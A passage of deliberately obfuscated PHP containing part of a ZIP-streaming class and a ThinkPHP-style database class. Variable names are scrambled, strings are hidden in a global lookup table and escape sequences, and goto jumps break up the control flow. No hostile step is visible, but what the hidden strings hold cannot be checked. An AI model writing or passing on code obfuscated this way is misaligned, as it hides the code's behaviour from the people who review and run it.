$E—òäåší±[1969]); goto bºÃ¶Å–”Ñ; DìÓ”Òªà: $this->addFileFooter($CÉÕÚŒ¼×, $C‚‘î¹Æ¯, $F‚ƒ¥Ù‹¥Œ, $f¦µËÓ©ğ, $Cë§ÈÑ£‰Œ, $D¿²íİ–ƒ…); goto E§Ó‹¹ê¬Î; bºÃ¶Å–”Ñ: while (!feof($e·Îò«Ê›ˆ)) { $BàêÏ‘Ã”© = fread($e·Îò«Ê›ˆ, 1048576); $this->send($BàêÏ‘Ã”©); } fclose($e·Îò«Ê›ˆ); $F‚ƒ¥Ù‹¥Œ = hexdec(hash_file($E—òäåší±[1970], $a¸Õ˜«Ú¯)); goto DìÓ”Òªà; E§Ó‹¹ê¬Î: } public function addFileFromStream($eºÄ“ô•, $e‘ó‘øõ›â) { goto eˆ„™¥ŠÌ; dê†±¬Æ­­: fseek($e‘ó‘øõ›â, 0, SEEK_END); $b¡‚êöÆÃ = $dº´©ñ®Ô = ftell($e‘ó‘øõ›â); rewind($e‘ó‘øõ›â); goto EÊÁÁØß; eˆ„™¥ŠÌ: $eºÄ“ô• = $this->filterFilename($eºÄ“ô•); $e ¨âÂŸ®È = static::METHOD_STORE; $a«ÉÀ‘ôÖ‰ = $this->addFileHeader($eºÄ“ô•, $e ¨âÂŸ®È); goto dê†±¬Æ­­; AØ·ñì›·: $this->addFileFooter($eºÄ“ô•, $e ¨âÂŸ®È, $A‰¶Ÿ§Êëè, $b¡‚êöÆÃ, $dº´©ñ®Ô, $a«ÉÀ‘ôÖ‰); goto dÊé”ô‹™ô; EÊÁÁØß: $e‡ËîáÅ = hash_init($_SERVER[Ä¿Ş°¨][1970]); while (!feof($e‘ó‘øõ›â)) { $Aóºˆ„‡ = fread($e‘ó‘øõ›â, 1048576); hash_update($e‡ËîáÅ, $Aóºˆ„‡); $this->send($Aóºˆ„‡); } $A‰¶Ÿ§Êëè = hexdec(hash_final($e‡ËîáÅ)); goto AØ·ñì›·; dÊé”ô‹™ô: } public function finish() { foreach ($this->files as $d†È‡ÎŸ˜ª) { $this->addCdrFile($d†È‡ÎŸ˜ª); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($DÊÎ’×‘ê™, $Fæœ±´ºÉù) { goto Cİå··ß…Ğ; Cİå··ß…Ğ: $Añ¤»ÑÅãÊ =& $_SERVER[Ä¿Ş°¨]; $DÊÎ’×‘ê™ = preg_replace($Añ¤»ÑÅãÊ[1971], $Añ¤»ÑÅãÊ[33], $DÊÎ’×‘ê™); $b¶—¸Š÷ó = strlen($DÊÎ’×‘ê™); goto f“›âëî¹»; Cİ©ŸË½ï£: return strlen($cÎ½ĞïÒİÖ) + $b¶—¸Š÷ó + strlen($Eˆ‰Üå¿ù¾); goto bÃ—’Æ¦ù¡; f“›âëî¹»: $FÔ·¯ŠÏˆº = $this->dosTime(time()); $D›¦‹Á´Ãí = array(array($Añ¤»ÑÅãÊ[1972], static::FILE_HEADER_SIGNATURE), array($Añ¤»ÑÅãÊ[1973], static::ZIP_VERSION_64), array($Añ¤»ÑÅãÊ[1973], 8), array($Añ¤»ÑÅãÊ[1973], $Fæœ±´ºÉù), array($Añ¤»ÑÅãÊ[1972], $FÔ·¯ŠÏˆº), array($Añ¤»ÑÅãÊ[1972], 0), array($Añ¤»ÑÅãÊ[1972], 4294967295), array($Añ¤»ÑÅãÊ[1972], 4294967295), array($Añ¤»ÑÅãÊ[1973], $b¶—¸Š÷ó), array($Añ¤»ÑÅãÊ[1973], 32)); $B‹è»à¹¦Å = array(array($Añ¤»ÑÅãÊ[1973], 1), array($Añ¤»ÑÅãÊ[1973], 28), array($Añ¤»ÑÅãÊ[1974], 0), array($Añ¤»ÑÅãÊ[1974], 0), array($Añ¤»ÑÅãÊ[1974], 0), array($Añ¤»ÑÅãÊ[1972], 0)); goto D’÷¬¿ÕÚˆ; D’÷¬¿ÕÚˆ: $cÎ½ĞïÒİÖ = $this->packFields($D›¦‹Á´Ãí); $Eˆ‰Üå¿ù¾ = $this->packFields($B‹è»à¹¦Å); $this->send($cÎ½ĞïÒİÖ . $DÊÎ’×‘ê™ . $Eˆ‰Üå¿ù¾); goto Cİ©ŸË½ï£; bÃ—’Æ¦ù¡: } protected function addFileFooter($eµòÙ‡ùá³, $a ™ŸßÅÅ©, $Bä­­Á±Ÿ, $a‹“Ùâõõ, $Bø’¡‘ˆ›Ò, $aŒ‘Œçƒ±÷) { $Cè¨éˆî¤ =& $_SERVER[Ä¿Ş°¨]; $cµó”È‰ä = array(array($Cè¨éˆî¤[1972], static::DATA_DESCRIPTOR_SIGNATURE), array($Cè¨éˆî¤[1972], $Bä­­Á±Ÿ), array($Cè¨éˆî¤[1974], $a‹“Ùâõõ), array($Cè¨éˆî¤[1974], $Bø’¡‘ˆ›Ò)); $fçš³¸«Óé = $this->packFields($cµó”È‰ä); $this->send($fçš³¸«Óé); $FùÔÇŸ¾èÕ = $aŒ‘Œçƒ±÷ + $a‹“Ùâõõ + $eîØ­¯ì¶Ó; $this->addToCdr($eµòÙ‡ùá³, $a ™ŸßÅÅ©, $Bä­­Á±Ÿ, $a‹“Ùâõõ, $Bø’¡‘ˆ›Ò, $FùÔÇŸ¾èÕ); } private function addToCdr($Eğ“Ş”ã, $d‰íÌ ëë¨, $BØ·ëŠÄ, $EÍğ‘¬´éø, $E÷×¼±…•í, $D¿¶ëøª¿ò) { $this->files[] = array($Eğ“Ş”ã, $d‰íÌ ëë¨, $BØ·ëŠÄ, $EÍğ‘¬´éø, $E÷×¼±…•í, $this->ofs); $this->ofs += $D¿¶ëøª¿ò; } protected function addCdrFile($a·¬±à„Ÿ“) { goto dâÄŞ„í—•; E±– ŞËÎá: $dôåæ£ì÷Ú = $this->dosTime(time()); $c°è³ƒ‹ô· = array(array($a¨ÒĞØ‘[1972], static::CDR_FILE_SIGNATURE), array($a¨ÒĞØ‘[1973], static::ZIP_VERSION_64), array($a¨ÒĞØ‘[1973], static::ZIP_VERSION_64), array($a¨ÒĞØ‘[1973], 8), array($a¨ÒĞØ‘[1973], $E‡Å•Õ’ë®), array($a¨ÒĞØ‘[1972], $dôåæ£ì÷Ú), array($a¨ÒĞØ‘[1972], $aÜñ¯Õ¯Â), array($a¨ÒĞØ‘[1972], 4294967295), array($a¨ÒĞØ‘[1972], 4294967295), array($a¨ÒĞØ‘[1973], strlen($d®Œ»”³æÓ)), array($a¨ÒĞØ‘[1973], 32), array($a¨ÒĞØ‘[1973], strlen($b£öãšÚÄ)), array($a¨ÒĞØ‘[1973], 0), array($a¨ÒĞØ‘[1973], 0), array($a¨ÒĞØ‘[1972], 32), array($a¨ÒĞØ‘[1972], 4294967295)); $b¢×îö…Á… = array(array($a¨ÒĞØ‘[1973], 1), array($a¨ÒĞØ‘[1973], 28), array($a¨ÒĞØ‘[1974], $CÒÆ™éåÈ›), array($a¨ÒĞØ‘[1974], $cÇ›®¹ùÂ), array($a¨ÒĞØ‘[1974], $BÀĞƒºÆ¬®), array($a¨ÒĞØ‘[1972], 0)); goto a‹‡Ê¦™Û; a‹‡Ê¦™Û: $Fô‹·Üçº® = $this->packFields($c°è³ƒ‹ô·); $cæ‡›Ê÷ = $this->packFields($b¢×îö…Á…); $cÉ«È»ñï = $Fô‹·Üçº® . $d®Œ»”³æÓ . $b£öãšÚÄ . $cæ‡›Ê÷; goto e…ÀÊï¦‹µ; e…ÀÊï¦‹µ: $this->send($cÉ«È»ñï); $this->cdr_ofs += strlen($cÉ«È»ñï); goto eÅó“Ù³; dâÄŞ„í—•: $a¨ÒĞØ‘ =& $_SERVER[Ä¿Ş°¨]; list($d®Œ»”³æÓ, $E‡Å•Õ’ë®, $aÜñ¯Õ¯Â, $cÇ›®¹ùÂ, $CÒÆ™éåÈ›, $BÀĞƒºÆ¬®) = $a·¬±à„Ÿ“; $b£öãšÚÄ = $a¨ÒĞØ‘[33]; goto E±– ŞËÎá; eÅó“Ù³: } protected function addCdr64Eof() { goto Dº£ƒ¢óÂ; F¶ÙÏîÑ›: $this->send($b±¨³×ï¹Ï); goto CäÜ¿ùÊ; f¼ï…‘öÍ™: $D§Àƒªã‡Å = $this->ofs; $EÃÙòÅ—Å§ = array(array($fØˆ»ïÉ³ô[1972], static::ZIP64_CDR_EOF_SIGNATURE), array($fØˆ»ïÉ³ô[1974], 44), array($fØˆ»ïÉ³ô[1973], static::ZIP_VERSION_64), array($fØˆ»ïÉ³ô[1973], static::ZIP_VERSION_64), array($fØˆ»ïÉ³ô[1972], 0), array($fØˆ»ïÉ³ô[1972], 0), array($fØˆ»ïÉ³ô[1974], $Aİ©àÂã•), array($fØˆ»ïÉ³ô[1974], $Aİ©àÂã•), array($fØˆ»ïÉ³ô[1974], $A¬á’ÍÑ‹), array($fØˆ»ïÉ³ô[1974], $D§Àƒªã‡Å)); $b±¨³×ï¹Ï = $this->packFields($EÃÙòÅ—Å§); goto F¶ÙÏîÑ›; Dº£ƒ¢óÂ: $fØˆ»ïÉ³ô =& $_SERVER[Ä¿Ş°¨]; $Aİ©àÂã• = count($this->files); $A¬á’ÍÑ‹ = $this->cdr_ofs; goto f¼ï…‘öÍ™; CäÜ¿ùÊ: } protected function addCdr64Locator() { goto bÙÍ™†°¾; AÈ§¬ÊÚ¡´: $this->send($BãÔÇŠÏÅ); goto a·çí¥ø¼; fà‰Î“¥¯¹: $dƒÌœåŒ¼š = $this->ofs; $c“¥Çíó’¹ = array(array($e¶ºÕ¼Á…ø[1972], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($e¶ºÕ¼Á…ø[1972], 0), array($e¶ºÕ¼Á…ø[1974], $dƒÌœåŒ¼š + $Bˆ²î¿æ×Ö), array($e¶ºÕ¼Á…ø[1972], 1)); $BãÔÇŠÏÅ = $this->packFields($c“¥Çíó’¹); goto AÈ§¬ÊÚ¡´; bÙÍ™†°¾: $e¶ºÕ¼Á…ø =& $_SERVER[Ä¿Ş°¨]; $bƒè¡ÄÏšØ = count($this->files); $Bˆ²î¿æ×Ö = $this->cdr_ofs; goto fà‰Î“¥¯¹; a·çí¥ø¼: } protected function addCdrEof() { goto Bó­±ù¡¸»; Bó­±ù¡¸»: $Bí³ôò£ô’ =& $_SERVER[Ä¿Ş°¨]; $FòÒäÚÉ•Ô = count($this->files); $cßÍ¾ÎÃ… = $this->cdr_ofs; goto B¡´†¸Š±Ó; B¡´†¸Š±Ó: $c‹Â®ƒÊâÎ = $this->ofs; $fâÔºö°óé = $Bí³ôò£ô’[33]; $Aƒ…‘²ÌÑ¿ = array(array($Bí³ôò£ô’[1972], static::CDR_EOF_SIGNATURE), array($Bí³ôò£ô’[1973], 0), array($Bí³ôò£ô’[1973], 0), array($Bí³ôò£ô’[1973], $FòÒäÚÉ•Ô), array($Bí³ôò£ô’[1973], $FòÒäÚÉ•Ô), array($Bí³ôò£ô’[1972], 4294967295), array($Bí³ôò£ô’[1972], 4294967295), array($Bí³ôò£ô’[1973], strlen($fâÔºö°óé))); goto C¬²šè‡ƒ; C¬²šè‡ƒ: $dÁ¾’¸Æ¤¶ = $this->packFields($Aƒ…‘²ÌÑ¿) . $fâÔºö°óé; $this->send($dÁ¾’¸Æ¤¶); goto b”×Á˜‘; b”×Á˜‘: } protected function addCdr() { foreach ($this->files as $c……ÈÈ‚…) { $this->addCdrFile($c……ÈÈ‚…); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $A»ÖšÉµ¥¸ =& $_SERVER[Ä¿Ş°¨]; $bçÇËóÆ½¨ = $A»ÖšÉµ¥¸[198]; if ($this->outputName) { $e´µ”´¼›İ = trim(str_replace(array($A»ÖšÉµ¥¸[112], $A»ÖšÉµ¥¸[55], $A»ÖšÉµ¥¸[93], $A»ÖšÉµ¥¸[67], $A»ÖšÉµ¥¸[213], $A»ÖšÉµ¥¸[977]), $A»ÖšÉµ¥¸[33], $this->outputName)); $BË¿¬ÜÍ÷ˆ = rawurlencode($e´µ”´¼›İ); $bçÇËóÆ½¨ .= "\x3b\40\146\151\154\x65\x6e\141\x6d\145\52\x3d\165\164\146\55\x38\47\47{$BË¿¬ÜÍ÷ˆ}"; } $aİêÖÇÍä¨ = array($A»ÖšÉµ¥¸[195] => $A»ÖšÉµ¥¸[1975], $A»ÖšÉµ¥¸[1976] => $bçÇËóÆ½¨, $A»ÖšÉµ¥¸[1977] => $A»ÖšÉµ¥¸[1978], $A»ÖšÉµ¥¸[1979] => $A»ÖšÉµ¥¸[1980], $A»ÖšÉµ¥¸[1981] => $A»ÖšÉµ¥¸[1982]); foreach ($aİêÖÇÍä¨ as $eìÏçô¨±Œ => $a‚øäì‚í) { header($eìÏçô¨±Œ . $A»ÖšÉµ¥¸[867] . $a‚øäì‚í); } } protected function send($bô–Ï…Ô«ª) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $bô–Ï…Ô«ª); } protected final function dosTime($Bé¤Í–Ÿ¶) { $aÎ„òÑÇ†† =& $_SERVER[Ä¿Ş°¨]; $B¬¯Ô¦‚î = getdate($Bé¤Í–Ÿ¶); if ($B¬¯Ô¦‚î[$aÎ„òÑÇ††[1684]] < 1980) { $B¬¯Ô¦‚î = array($aÎ„òÑÇ††[1684] => 1980, $aÎ„òÑÇ††[1983] => 1, $aÎ„òÑÇ††[1984] => 1, $aÎ„òÑÇ††[1985] => 0, $aÎ„òÑÇ††[1986] => 0, $aÎ„òÑÇ††[1987] => 0); } $B¬¯Ô¦‚î[$aÎ„òÑÇ††[1684]] -= 1980; return $B¬¯Ô¦‚î[$aÎ„òÑÇ††[1684]] << 25 | $B¬¯Ô¦‚î[$aÎ„òÑÇ††[1983]] << 21 | $B¬¯Ô¦‚î[$aÎ„òÑÇ††[1984]] << 16 | $B¬¯Ô¦‚î[$aÎ„òÑÇ††[1985]] << 11 | $B¬¯Ô¦‚î[$aÎ„òÑÇ††[1986]] << 5 | $B¬¯Ô¦‚î[$aÎ„òÑÇ††[1987]] >> 1; } protected function packFields($e™¼§Àæêë) { $aó‹‹§çŒ =& $_SERVER[Ä¿Ş°¨]; $dÑ‹¶ö–œ = $aó‹‹§çŒ[33]; $AÇŸ¸³ìÁ = array(); foreach ($e™¼§Àæêë as $E‰­¦Ø•®«) { $dÑ‹¶ö–œ .= $E‰­¦Ø•®«[0]; $AÇŸ¸³ìÁ[] = $E‰­¦Ø•®«[1]; } array_unshift($AÇŸ¸³ìÁ, $dÑ‹¶ö–œ); return call_user_func_array($aó‹‹§çŒ[1988], $AÇŸ¸³ìÁ); } protected function filterFilename($EÂ°»Ø¯¢Ò) { $Aõè­ƒÒ¯¥ =& $_SERVER[Ä¿Ş°¨]; return str_replace(array($Aõè­ƒÒ¯¥[93], $Aõè­ƒÒ¯¥[4], $Aõè­ƒÒ¯¥[172], $Aõè­ƒÒ¯¥[69], $Aõè­ƒÒ¯¥[112], $Aõè­ƒÒ¯¥[912], $Aõè­ƒÒ¯¥[915], $Aõè­ƒÒ¯¥[267]), $Aõè­ƒÒ¯¥[70], $EÂ°»Ø¯¢Ò); } } class ZipStream { } goto F¶©èˆ†¿©; AÛ¸‡Â¸Ÿ®: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\x71" => "\x3c\x3e", "\147\x74" => "\x3e", "\x65\x67\164" => "\x3e\x3d", "\154\x74" => "\74", "\145\154\164" => "\x3c\x3d", "\156\157\x74\154\151\153\145" => "\116\117\124\40\x4c\111\113\x45", "\x6c\x69\153\145" => "\x4c\111\x4b\105", "\x69\156" => "\x49\116", "\x6e\157\x74\151\x6e" => "\116\117\124\40\111\x4e", "\x6e\157\x74\40\151\156" => "\x4e\117\x54\40\x49\116", "\x62\145\x74\x77\145\145\156" => "\102\x45\x54\127\105\x45\x4e", "\x6e\157\x74\x62\145\x74\x77\x65\x65\156" => "\116\x4f\x54\x20\102\x45\124\127\105\105\116", "\x6e\157\x74\x20\142\145\x74\167\x65\x65\x6e" => "\116\117\x54\40\x42\x45\124\127\105\x45\x4e"); protected $selectSql = "\x53\105\114\x45\103\x54\x25\104\111\x53\124\x49\116\x43\x54\x25\40\x25\x46\x49\105\114\104\x25\x20\106\122\x4f\x4d\x20\45\x54\101\x42\114\105\45\x25\x4a\x4f\111\x4e\45\x25\x57\x48\x45\x52\x45\x25\x25\x47\122\x4f\125\120\x25\45\x48\101\126\111\x4e\107\x25\x25\117\x52\x44\x45\x52\x25\x25\x4c\111\x4d\x49\x54\x25\x20\x25\x55\x4e\111\x4f\x4e\45\x25\x43\x4f\x4d\115\105\116\124\45"; protected $bind = array(); public static function getInstance() { $aØå«ìœô‰ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ä¿Ş°¨][862], $aØå«ìœô‰); } public function factory($bÒó…ß½ŞÑ = '') { goto F’±Ÿ¥ß„¶; BÑìªë³·â: return $FØ˜´¬Ğ¯Ï; goto fÊ°…‚ì¬ ; AöÀì‚™ï’: $this->dbType = ucwords(strtolower($bÒó…ß½ŞÑ[$FØ‚Ô¯Ò®”[863]])); $c’ÜŒ‚…ô = $FØ‚Ô¯Ò®”[865] . $this->dbType; if (class_exists($c’ÜŒ‚…ô)) { $FØ˜´¬Ğ¯Ï = new $c’ÜŒ‚…ô($bÒó…ß½ŞÑ); if ($FØ‚Ô¯Ò®”[718] != strtolower($bÒó…ß½ŞÑ[$FØ‚Ô¯Ò®”[863]])) { $FØ˜´¬Ğ¯Ï->dbType = strtoupper($this->dbType); } else { $FØ˜´¬Ğ¯Ï->dbType = $this->_getDsnType($bÒó…ß½ŞÑ[$FØ‚Ô¯Ò®”[815]]); } } else { think_exception(think_lang($FØ‚Ô¯Ò®”[866]) . $FØ‚Ô¯Ò®”[867] . $c’ÜŒ‚…ô); } goto BÑìªë³·â; F’±Ÿ¥ß„¶: $FØ‚Ô¯Ò®” =& $_SERVER[Ä¿Ş°¨]; $bÒó…ß½ŞÑ = $this->parseConfig($bÒó…ß½ŞÑ); if (empty($bÒó…ß½ŞÑ[$FØ‚Ô¯Ò®”[863]])) { think_exception(think_lang($FØ‚Ô¯Ò®”[864])); } goto AöÀì‚™ï’; fÊ°…‚ì¬ : } public function __call($cŞÙ†¤ËáÙ, $a„ù™Ê™ô‡) { if (method_exists($this, $cŞÙ†¤ËáÙ)) { return call_user_func_array(array($this, $cŞÙ†¤ËáÙ), $a„ù™Ê™ô‡); } } protected function _getDsnType($Fàõ÷ŒÛá¢) { $eèáÛ´¬¶ï = explode($_SERVER[Ä¿Ş°¨][4], $Fàõ÷ŒÛá¢); $aõÆ›©ˆñš = strtoupper(trim($eèáÛ´¬¶ï[0])); return $aõÆ›©ˆñš; } private function parseConfig($F¥ó–îÇåš = '') { $A„ô¿¾è’ =& $_SERVER[Ä¿Ş°¨]; if (!empty($F¥ó–îÇåš) && is_string($F¥ó–îÇåš)) { $F¥ó–îÇåš = $this->parseDSN($F¥ó–îÇåš); } elseif (is_array($F¥ó–îÇåš)) { $F¥ó–îÇåš = array_change_key_case($F¥ó–îÇåš); $F¥ó–îÇåš = array($A„ô¿¾è’[863] => $F¥ó–îÇåš[$A„ô¿¾è’[717]], $A„ô¿¾è’[788] => $F¥ó–îÇåš[$A„ô¿¾è’[868]], $A„ô¿¾è’[789] => $F¥ó–îÇåš[$A„ô¿¾è’[869]], $A„ô¿¾è’[786] => $F¥ó–îÇåš[$A„ô¿¾è’[870]], $A„ô¿¾è’[787] => $F¥ó–îÇåš[$A„ô¿¾è’[871]], $A„ô¿¾è’[17] => $F¥ó–îÇåš[$A„ô¿¾è’[872]], $A„ô¿¾è’[815] => $F¥ó–îÇåš[$A„ô¿¾è’[719]], $A„ô¿¾è’[13] => isset($F¥ó–îÇåš[$A„ô¿¾è’[873]]) ? $F¥ó–îÇåš[$A„ô¿¾è’[873]] : array()); } elseif (empty($F¥ó–îÇåš)) { if (think_config($A„ô¿¾è’[874]) && $A„ô¿¾è’[718] != strtolower(think_config($A„ô¿¾è’[875]))) { $F¥ó–îÇåš = $this->parseDSN(think_config($A„ô¿¾è’[874])); } else { $F¥ó–îÇåš = array($A„ô¿¾è’[863] => think_config($A„ô¿¾è’[875]), $A„ô¿¾è’[788] => think_config($A„ô¿¾è’[876]), $A„ô¿¾è’[789] => think_config($A„ô¿¾è’[877]), $A„ô¿¾è’[786] => think_config($A„ô¿¾è’[878]), $A„ô¿¾è’[787] => think_config($A„ô¿¾è’[879]), $A„ô¿¾è’[17] => think_config($A„ô¿¾è’[230]), $A„ô¿¾è’[815] => think_config($A„ô¿¾è’[874]), $A„ô¿¾è’[13] => think_config($A„ô¿¾è’[880])); } } return $F¥ó–îÇåš; } protected function initConnect($aÛ³ØµÇ… = true) { if (1 == think_config($_SERVER[Ä¿Ş°¨][18])) { $this->_linkID = $this->multiConnect($aÛ³ØµÇ…); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($CÔÃ¼ìêòø = false) { $Dìà‚ÚìÁÏ =& $_SERVER[Ä¿Ş°¨]; static $f®¯ÄË½ é = array(); if (empty($f®¯ÄË½ é)) { foreach ($this->config as $aÖ‡Ô»¬ƒÍ => $E¢Æ»ğ‹ø×) { $f®¯ÄË½ é[$aÖ‡Ô»¬ƒÍ] = explode($Dìà‚ÚìÁÏ[47], $E¢Æ»ğ‹ø×); } } if (think_config($Dìà‚ÚìÁÏ[881])) { if ($CÔÃ¼ìêòø) { $Bù¹ŠÅ°ç» = floor(mt_rand(0, think_config($Dìà‚ÚìÁÏ[882]) - 1)); } else { if (is_numeric(think_config($Dìà‚ÚìÁÏ[883]))) { $Bù¹ŠÅ°ç» = think_config($Dìà‚ÚìÁÏ[883]); } else { $Bù¹ŠÅ°ç» = floor(mt_rand(think_config($Dìà‚ÚìÁÏ[882]), count($f®¯ÄË½ é[$Dìà‚ÚìÁÏ[786]]) - 1)); } } } else { $Bù¹ŠÅ°ç» = floor(mt_rand(0, count($f®¯ÄË½ é[$Dìà‚ÚìÁÏ[786]]) - 1)); } $E•¶ÕÌèÏ = array($Dìà‚ÚìÁÏ[788] => isset($f®¯ÄË½ é[$Dìà‚ÚìÁÏ[788]][$Bù¹ŠÅ°ç»]) ? $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[788]][$Bù¹ŠÅ°ç»] : $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[788]][0], $Dìà‚ÚìÁÏ[789] => isset($f®¯ÄË½ é[$Dìà‚ÚìÁÏ[789]][$Bù¹ŠÅ°ç»]) ? $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[789]][$Bù¹ŠÅ°ç»] : $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[789]][0], $Dìà‚ÚìÁÏ[786] => isset($f®¯ÄË½ é[$Dìà‚ÚìÁÏ[786]][$Bù¹ŠÅ°ç»]) ? $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[786]][$Bù¹ŠÅ°ç»] : $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[786]][0], $Dìà‚ÚìÁÏ[787] => isset($f®¯ÄË½ é[$Dìà‚ÚìÁÏ[787]][$Bù¹ŠÅ°ç»]) ? $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[787]][$Bù¹ŠÅ°ç»] : $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[787]][0], $Dìà‚ÚìÁÏ[17] => isset($f®¯ÄË½ é[$Dìà‚ÚìÁÏ[17]][$Bù¹ŠÅ°ç»]) ? $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[17]][$Bù¹ŠÅ°ç»] : $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[17]][0], $Dìà‚ÚìÁÏ[815] => isset($f®¯ÄË½ é[$Dìà‚ÚìÁÏ[815]][$Bù¹ŠÅ°ç»]) ? $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[815]][$Bù¹ŠÅ°ç»] : $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[815]][0], $Dìà‚ÚìÁÏ[13] => isset($f®¯ÄË½ é[$Dìà‚ÚìÁÏ[13]][$Bù¹ŠÅ°ç»]) ? $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[13]][$Bù¹ŠÅ°ç»] : $f®¯ÄË½ é[$Dìà‚ÚìÁÏ[13]][0]); return $this->connect($E•¶ÕÌèÏ, $Bù¹ŠÅ°ç»); } public function parseDSN($fõØğÌ½ÍÏ) { $B“ñÜ…éæ‰ =& $_SERVER[Ä¿Ş°¨]; if (empty($fõØğÌ½ÍÏ)) { return !1; } $b¬ì¡¨‡¿ = parse_url($fõØğÌ½ÍÏ); if ($b¬ì¡¨‡¿[$B“ñÜ…éæ‰[164]]) { $Bß½É¤—ó­ = array($B“ñÜ…éæ‰[863] => $b¬ì¡¨‡¿[$B“ñÜ…éæ‰[164]], $B“ñÜ…éæ‰[788] => isset($b¬ì¡¨‡¿[$B“ñÜ…éæ‰[539]]) ? $b¬ì¡¨‡¿[$B“ñÜ…éæ‰[539]] : $B“ñÜ…éæ‰[33], $B“ñÜ…éæ‰[789] => isset($b¬ì¡¨‡¿[$B“ñÜ…éæ‰[884]]) ? $b¬ì¡¨‡¿[$B“ñÜ…éæ‰[884]] : $B“ñÜ…éæ‰[33], $B“ñÜ…éæ‰[786] => isset($b¬ì¡¨‡¿[$B“ñÜ…éæ‰[165]]) ? $b¬ì¡¨‡¿[$B“ñÜ…éæ‰[165]] : $B“ñÜ…éæ‰[33], $B“ñÜ…éæ‰[787] => isset($b¬ì¡¨‡¿[$B“ñÜ…éæ‰[166]]) ? $b¬ì¡¨‡¿[$B“ñÜ…éæ‰[166]] : $B“ñÜ…éæ‰[33], $B“ñÜ…éæ‰[17] => isset($b¬ì¡¨‡¿[$B“ñÜ…éæ‰[75]]) ? substr($b¬ì¡¨‡¿[$B“ñÜ…éæ‰[75]], 1) : $B“ñÜ…éæ‰[33]); } else { preg_match($B“ñÜ…éæ‰[885], trim($fõØğÌ½ÍÏ), $a‚´ÇİĞ„Ş); $Bß½É¤—ó­ = array($B“ñÜ…éæ‰[863] => $a‚´ÇİĞ„Ş[1], $B“ñÜ…éæ‰[788] => $a‚´ÇİĞ„Ş[2], $B“ñÜ…éæ‰[789] => $a‚´ÇİĞ„Ş[3], $B“ñÜ…éæ‰[786] => $a‚´ÇİĞ„Ş[4], $B“ñÜ…éæ‰[787] => $a‚´ÇİĞ„Ş[5], $B“ñÜ…éæ‰[17] => $a‚´ÇİĞ„Ş[6]); } $Bß½É¤—ó­[$B“ñÜ…éæ‰[815]] = $B“ñÜ…éæ‰[33]; return $Bß½É¤—ó­; } protected function debug() { $e°·Óª‚âö =& $_SERVER[Ä¿Ş°¨]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $e°·Óª‚âö[886]; if (think_config($e°·Óª‚âö[887])) { think_status($e°·Óª‚âö[888]); think_trace($this->queryStr . $e°·Óª‚âö[889] . think_status($e°·Óª‚âö[20], $e°·Óª‚âö[888], 6) . $e°·Óª‚âö[890], $e°·Óª‚âö[33], $e°·Óª‚âö[891]); } } protected function parseLock($eß†âÏÎ¼á = false) { $d›Ìˆİ·„ß =& $_SERVER[Ä¿Ş°¨]; if (!$eß†âÏÎ¼á) { return $d›Ìˆİ·„ß[33]; } if ($d›Ìˆİ·„ß[817] == $this->dbType) { return $d›Ìˆİ·„ß[892]; } return $d›Ìˆİ·„ß[893]; } protected function parseSet($FŸÁÒİ‚È) { $F†°øŠå»³ =& $_SERVER[Ä¿Ş°¨]; foreach ($FŸÁÒİ‚È as $D·Á˜ Ï»è => $DÏæ¿åóê•) { if (is_array($DÏæ¿åóê•) && $F†°øŠå»³[281] == $DÏæ¿åóê•[0]) { $aÛëã›Î¦Ù[] = $this->parseKey($D·Á˜ Ï»è) . $F†°øŠå»³[894] . $DÏæ¿åóê•[1]; } elseif (is_scalar($DÏæ¿åóê•) || is_null($DÏæ¿åóê•)) { $aÛëã›Î¦Ù[] = $this->parseKey($D·Á˜ Ï»è) . $F†°øŠå»³[894] . $this->parseValue($DÏæ¿åóê•); } } return $F†°øŠå»³[895] . implode($F†°øŠå»³[47], $aÛëã›Î¦Ù); } protected function bindParam($EÛÚšĞÚÖ×, $dÏÌ†ã„½) { $this->bind[$_SERVER[Ä¿Ş°¨][4] . $EÛÚšĞÚÖ×] = $dÏÌ†ã„½; } protected function parseBind($AÙ˜Ôõ®³«) { $AÙ˜Ôõ®³« = array_merge($this->bind, $AÙ˜Ôõ®³«); $this->bind = array(); return $AÙ˜Ôõ®³«; } function parseKey(&$EØš´Áƒ¹Ê, $EæÎ“ğ× = true) { if ($EæÎ“ğ×) { $EØš´Áƒ¹Ê = $this->parseKeyCheck($EØš´Áƒ¹Ê); } return $EØš´Áƒ¹Ê; } function parseKeyCheck($c¿‘ñ™·ïé) { $Eç¡¡È¿àù =& $_SERVER[Ä¿Ş°¨]; $c¿‘ñ™·ïé = trim($c¿‘ñ™·ïé); if (!preg_match($Eç¡¡È¿àù[896], $c¿‘ñ™·ïé)) { think_exception($Eç¡¡È¿àù[897] . $c¿‘ñ™·ïé); } return $c¿‘ñ™·ïé; } protected function parseValue($c¶…¨Š¥íæ) { $Eˆ»É–‰ãñ =& $_SERVER[Ä¿Ş°¨]; if (is_string($c¶…¨Š¥íæ)) { $c¶…¨Š¥íæ = $Eˆ»É–‰ãñ[856] . 